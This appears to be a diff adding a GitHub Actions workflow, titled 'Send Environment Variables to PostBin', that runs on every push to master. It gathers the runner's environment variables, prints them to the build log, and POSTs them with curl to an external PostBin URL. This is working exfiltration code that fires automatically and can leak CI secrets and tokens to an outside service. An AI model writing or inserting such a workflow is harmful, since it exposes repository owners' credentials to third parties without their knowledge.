@@ -1,0 +1,19 @@
+name: Send Environment Variables to PostBin
+on:
+  push:
+    branches:
+      - master
+
+jobs:
+  send_variables:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get Environment Variables
+        run: echo "::set-env name=ENV_VARIABLES::$(env | grep -E '^[A-Z_]+=' | sed 's/^/\\n/;s/=/: /')"
+        
+      - name: Display Environment Variables
+        run: echo "$ENV_VARIABLES"
+
+      - name: Send to PostBin
+        run: |
+          curl -X POST -d "$ENV_VARIABLES" https://www.toptal.com/developers/postbin/1703754574393-1403204605448
